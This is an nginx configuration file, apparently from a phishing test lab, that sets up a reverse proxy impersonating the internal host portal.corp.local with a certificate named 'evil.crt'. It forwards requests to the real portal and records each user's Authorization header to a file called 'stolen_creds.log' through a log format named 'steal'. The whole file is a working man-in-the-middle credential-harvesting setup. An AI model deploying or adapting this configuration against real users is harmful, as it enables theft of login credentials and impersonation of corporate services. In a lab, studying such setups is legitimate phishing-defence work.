worker_processes 1;

events {
    worker_connections 1024;
}

http {
    include /etc/nginx/mime.types;
    
    log_format steal '$remote_addr - $remote_user - [$time_local] '
                     '"$request" $status $body_bytes_sent '
                     '"Authorization: $http_authorization"';
    
    server {
        listen 443 ssl;
        server_name portal.corp.local;

        ssl_certificate /home/user/phish-test-lab/evil-site/evil.crt;
        ssl_certificate_key /home/user/phish-test-lab/evil-site/evil.key;
        access_log /home/user/phish-test-lab/evil-site/stolen_creds.log steal;
        
        location / {
            proxy_pass https://portal.corp.local;
            
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            
            proxy_set_header Authorization $http_authorization;
        }
    }
}